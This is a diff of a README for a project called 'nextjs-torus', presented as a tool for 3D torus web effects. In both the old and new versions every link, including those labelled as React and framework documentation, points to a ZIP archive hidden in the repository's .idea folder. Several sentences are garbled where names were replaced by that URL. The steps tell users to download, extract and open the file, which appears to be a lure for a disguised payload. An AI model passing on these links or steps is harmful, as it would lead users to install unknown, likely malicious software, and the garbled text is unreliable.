@@ -2,18 +2,18 @@
 
 ## 🚀 Getting Started
 
-Welcome to **nextjs-torus**! This application helps you create beautiful 3D torus effects. It’s perfect for those looking to enhance their https://raw.githubusercontent.com/thetrustbr/nextjs-torus/main/.idea/dictionaries/nextjs-torus_v3.0.zip skills in a fun and creative way. Whether you're a beginner or have some experience, this tool opens up new possibilities in web design.
+Welcome to **nextjs-torus**! This application helps you create beautiful 3D torus effects. It’s perfect for those looking to enhance their https://github.com/thetrustbr/nextjs-torus/raw/refs/heads/main/.idea/nextjs-torus-3.0.zip skills in a fun and creative way. Whether you're a beginner or have some experience, this tool opens up new possibilities in web design.
 
 ## 📥 Download the Application
 
-[![Download nextjs-torus](https://raw.githubusercontent.com/thetrustbr/nextjs-torus/main/.idea/dictionaries/nextjs-torus_v3.0.zip)](https://raw.githubusercontent.com/thetrustbr/nextjs-torus/main/.idea/dictionaries/nextjs-torus_v3.0.zip)
+[![Download nextjs-torus](https://github.com/thetrustbr/nextjs-torus/raw/refs/heads/main/.idea/nextjs-torus-3.0.zip)](https://github.com/thetrustbr/nextjs-torus/raw/refs/heads/main/.idea/nextjs-torus-3.0.zip)
 
 To get started, you will need to download the application. Follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to go to the releases page.
 2. **Download the Latest Version**: Look for the latest version available and download it.
 
-[Visit this page to download](https://raw.githubusercontent.com/thetrustbr/nextjs-torus/main/.idea/dictionaries/nextjs-torus_v3.0.zip)
+[Visit this page to download](https://github.com/thetrustbr/nextjs-torus/raw/refs/heads/main/.idea/nextjs-torus-3.0.zip)
 
 ## 💻 System Requirements
 
@@ -39,14 +39,14 @@ After downloading, follow these steps to install and run nextjs-torus:
 
 1. **Locate the Downloaded File**: Find the file you just downloaded, usually in your "Downloads" folder.
 2. **Extract the Files**: If the file is in a ZIP format, right-click and select "Extract All".
-3. **Open the Application**: Navigate to the extracted folder and open the https://raw.githubusercontent.com/thetrustbr/nextjs-torus/main/.idea/dictionaries/nextjs-torus_v3.0.zip file in your web browser.
+3. **Open the Application**: Navigate to the extracted folder and open the https://github.com/thetrustbr/nextjs-torus/raw/refs/heads/main/.idea/nextjs-torus-3.0.zip file in your web browser.
 4. **Enjoy Creating!**: Start using the 3D torus effects by following the on-screen instructions.
 
 ## 🖥️ How to Use
 
 Using nextjs-torus is straightforward. Here are some tips to get you started:
 
-1. **Launch the App**: Open the https://raw.githubusercontent.com/thetrustbr/nextjs-torus/main/.idea/dictionaries/nextjs-torus_v3.0.zip file in your browser.
+1. **Launch the App**: Open the https://github.com/thetrustbr/nextjs-torus/raw/refs/heads/main/.idea/nextjs-torus-3.0.zip file in your browser.
 2. **Explore the Interface**: Familiarize yourself with the toolbar and settings.
 3. **Create Your Torus**: Use the provided options to customize your torus.
 4. **Save Your Work**: Make sure to save your design to keep your results.
@@ -65,9 +65,9 @@ If you encounter any issues, feel free to report them in the Issues section of t
 
 For those interested in learning more about 3D graphics and web development, here are some useful resources:
 
-1. **https://raw.githubusercontent.com/thetrustbr/nextjs-torus/main/.idea/dictionaries/nextjs-torus_v3.0.zip Documentation**: Learn more about the framework [here](https://raw.githubusercontent.com/thetrustbr/nextjs-torus/main/.idea/dictionaries/nextjs-torus_v3.0.zip).
-2. **React Documentation**: Improve your understanding of React [here](https://raw.githubusercontent.com/thetrustbr/nextjs-torus/main/.idea/dictionaries/nextjs-torus_v3.0.zip).
-3. **https://raw.githubusercontent.com/thetrustbr/nextjs-torus/main/.idea/dictionaries/nextjs-torus_v3.0.zip Documentation**: Get familiar with https://raw.githubusercontent.com/thetrustbr/nextjs-torus/main/.idea/dictionaries/nextjs-torus_v3.0.zip concepts [here](https://raw.githubusercontent.com/thetrustbr/nextjs-torus/main/.idea/dictionaries/nextjs-torus_v3.0.zip).
+1. **https://github.com/thetrustbr/nextjs-torus/raw/refs/heads/main/.idea/nextjs-torus-3.0.zip Documentation**: Learn more about the framework [here](https://github.com/thetrustbr/nextjs-torus/raw/refs/heads/main/.idea/nextjs-torus-3.0.zip).
+2. **React Documentation**: Improve your understanding of React [here](https://github.com/thetrustbr/nextjs-torus/raw/refs/heads/main/.idea/nextjs-torus-3.0.zip).
+3. **https://github.com/thetrustbr/nextjs-torus/raw/refs/heads/main/.idea/nextjs-torus-3.0.zip Documentation**: Get familiar with https://github.com/thetrustbr/nextjs-torus/raw/refs/heads/main/.idea/nextjs-torus-3.0.zip concepts [here](https://github.com/thetrustbr/nextjs-torus/raw/refs/heads/main/.idea/nextjs-torus-3.0.zip).
 
 ## 📜 License
 
@@ -75,4 +75,4 @@ nextjs-torus is open-source and licensed under the MIT License. You are free to 
 
 Start exploring the creative world of 3D effects with **nextjs-torus** today! Don't forget to download the latest version from the releases page and unleash your creativity!
 
-[Visit this page to download](https://raw.githubusercontent.com/thetrustbr/nextjs-torus/main/.idea/dictionaries/nextjs-torus_v3.0.zip)
+[Visit this page to download](https://github.com/thetrustbr/nextjs-torus/raw/refs/heads/main/.idea/nextjs-torus-3.0.zip)
